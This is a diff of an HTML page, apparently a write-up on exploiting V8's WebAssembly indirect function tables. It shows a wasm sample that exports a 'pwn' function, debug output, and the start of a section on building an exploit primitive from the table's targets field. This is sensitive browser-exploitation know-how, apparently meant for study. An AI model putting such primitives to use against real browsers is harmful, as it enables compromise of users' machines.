class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;51&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;106&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;98&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;119&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;]);
-&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-variable language_&#34;&gt;module&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;WebAssembly&lt;/span&gt;.&lt;span class=&#34;hljs-title class_&#34;&gt;Module&lt;/span&gt;(code);
-&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; instance = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;WebAssembly&lt;/span&gt;.&lt;span class=&#34;hljs-title class_&#34;&gt;Instance&lt;/span&gt;(&lt;span class=&#34;hljs-variable language_&#34;&gt;module&lt;/span&gt;, importObject);
-&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; times2 = instance.&lt;span class=&#34;hljs-property&#34;&gt;exports&lt;/span&gt;.&lt;span class=&#34;hljs-property&#34;&gt;times2&lt;/span&gt;;
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; code = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;118&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;106&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;51&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;106&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;98&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;119&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;]);
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Module(code);
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; instance = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Instance(&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;, importObject);
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; times2 = instance.exports.times2;
 
-%&lt;span class=&#34;hljs-title class_&#34;&gt;DebugPrint&lt;/span&gt;(instance);&lt;/code&gt;&lt;/pre&gt;
+%DebugPrint(instance);&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Wasm is mainly composed of a Module, an Instance, and a Table. A Module is the raw, uninitialized code, which turns into an Instance after going through an initialization process. An Instance can own multiple Tables, and in our example, we can see that &lt;code&gt;tbl&lt;/code&gt; created inside &lt;code&gt;importObject&lt;/code&gt; is passed along.&lt;/p&gt;
 &lt;p&gt;Within V8, an Instance is managed as a &lt;code&gt;WasmInstanceObject&lt;/code&gt;, and its key fields are as follows:&lt;/p&gt;
 &lt;ol&gt;
@@ -718,22 +718,22 @@ DebugPrint: 0x194f001cce8d: [FixedArray]
            1: 0
 &lt;span class=&#34;hljs-comment&#34;&gt;# ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;In the initial code snippet, we couldn&amp;#x2019;t directly see the declarations for &lt;code&gt;$f42&lt;/code&gt; and &lt;code&gt;$f83&lt;/code&gt;. To verify them yourself, converting the wasm code&amp;#x2014;which was originally declared as a &lt;code&gt;Uint8Array&lt;/code&gt;&amp;#x2014;into a human-readable format yields the following text:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs wasm&#34;&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; The common type we use throughout the sample.&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;param&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)))&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs wasm&#34;&gt;(module
+  ;; The common type we use throughout the sample.
+  (type $int2int (func (param i32) (result i32)))
 
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; Import a function named jstimes3 from the environment and call it&lt;/span&gt;
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; $jstimes3 here.&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;env&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;jstimes3&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$jstimes3&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)))&lt;/span&gt;
+  ;; Import a function named jstimes3 from the environment and call it
+  ;; $jstimes3 here.
+  (import &amp;quot;env&amp;quot; &amp;quot;jstimes3&amp;quot; (func $jstimes3 (type $int2int)))
 
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;js&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tbl&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; funcref&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$f42&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;hljs-comment&#34;&gt;;; [1] Define $f42 function&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$f83&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;83&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;hljs-comment&#34;&gt;;; [2] Define $f83 function&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;elem&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f42&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f83&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;
+  (import &amp;quot;js&amp;quot; &amp;quot;tbl&amp;quot; (table 2 funcref))
+  (func $f42 (result i32) i32.const 42)  ;; [1] Define $f42 function
+  (func $f83 (result i32) i32.const 83)  ;; [2] Define $f83 function
+  (elem (i32.const 0) $f42 $f83)
 
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;times2&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pwn&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$jstimes3&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+  (func (export &amp;quot;times2&amp;quot;) (type $int2int) (i32.const 16))
+  (func (export &amp;quot;pwn&amp;quot;) (type $int2int) (i32.const 16) (call $jstimes3))
+)&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Looking at points &lt;code&gt;[1]&lt;/code&gt; and &lt;code&gt;[2]&lt;/code&gt;, you can see the declarations for both functions.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Since a full breakdown of the Wasm code will be covered at the very end of this post, feel free to refer to that section if you&amp;#x2019;d like to dive deeper into it! &amp;#x1F64F;&amp;#x1F3FB;&lt;/p&gt;
@@ -742,12 +742,12 @@ DebugPrint: 0x194f001cce8d: [FixedArray]
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/* wasm/wasm-objects-inl.h */&lt;/span&gt;
 
 &lt;span class=&#34;hljs-comment&#34;&gt;// WasmIndirectFunctionTable&lt;/span&gt;
-&lt;span class=&#34;hljs-built_in&#34;&gt;TQ_OBJECT_CONSTRUCTORS_IMPL&lt;/span&gt;(WasmIndirectFunctionTable)
-&lt;span class=&#34;hljs-built_in&#34;&gt;PRIMITIVE_ACCESSORS&lt;/span&gt;(WasmIndirectFunctionTable, sig_ids, &lt;span class=&#34;hljs-type&#34;&gt;uint32_t&lt;/span&gt;*,
+TQ_OBJECT_CONSTRUCTORS_IMPL(WasmIndirectFunctionTable)
+PRIMITIVE_ACCESSORS(WasmIndirectFunctionTable, sig_ids, &lt;span class=&#34;hljs-keyword&#34;&gt;uint32_t&lt;/span&gt;*,
                     kSigIdsOffset)
-&lt;span class=&#34;hljs-built_in&#34;&gt;PRIMITIVE_ACCESSORS&lt;/span&gt;(WasmIndirectFunctionTable, targets, Address*,    &lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
+PRIMITIVE_ACCESSORS(WasmIndirectFunctionTable, targets, Address*,    &lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
                     kTargetsOffset)
-&lt;span class=&#34;hljs-built_in&#34;&gt;OPTIONAL_ACCESSORS&lt;/span&gt;(WasmIndirectFunctionTable, managed_native_allocations,
+OPTIONAL_ACCESSORS(WasmIndirectFunctionTable, managed_native_allocations,
                    Foreign, kManagedNativeAllocationsOffset)&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Checking the contents at &lt;code&gt;[1]&lt;/code&gt;, we can see that the &lt;code&gt;WasmIndirectFunctionTable&lt;/code&gt; object contains a &lt;code&gt;targets&lt;/code&gt; field. As illustrated in the previous diagram, this field holds the address information for &lt;code&gt;$f42&lt;/code&gt; and &lt;code&gt;$f83&lt;/code&gt;. Recall that in the first patch, the allocation method was changed from using &lt;code&gt;PRIMITIVE_ACCESSORS&lt;/code&gt; to &lt;code&gt;ACCESSORS&lt;/code&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;d8&amp;gt; %DebugPrintPtr(0x325b001ccea9);
@@ -777,33 +777,33 @@ DebugPrint: 0x325b001ccea9: [WasmIndirectFunctionTable]
 &lt;h4 id=&#34;3-1-3-Construct-Primitive&#34;&gt;&lt;a href=&#34;#3-1-3-Construct-Primitive&#34; class=&#34;headerlink&#34; title=&#34;3.1.3. Construct Primitive&#34;&gt;&lt;/a&gt;3.1.3. Construct Primitive&lt;/h4&gt;&lt;p&gt;Now that we understand what kind of values are stored in the &lt;code&gt;targets&lt;/code&gt; field, we need to look into how we can actually leverage them. To set a value in this specific field, the &lt;code&gt;WasmIndirectFunctionTable::Set()&lt;/code&gt; function is used, which is implemented as follows:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/* wasm/wasm-objects.cc */&lt;/span&gt;
 
-&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmIndirectFunctionTable::Set&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;uint32_t&lt;/span&gt; index, &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; sig_id,&lt;/span&gt;&lt;/span&gt;
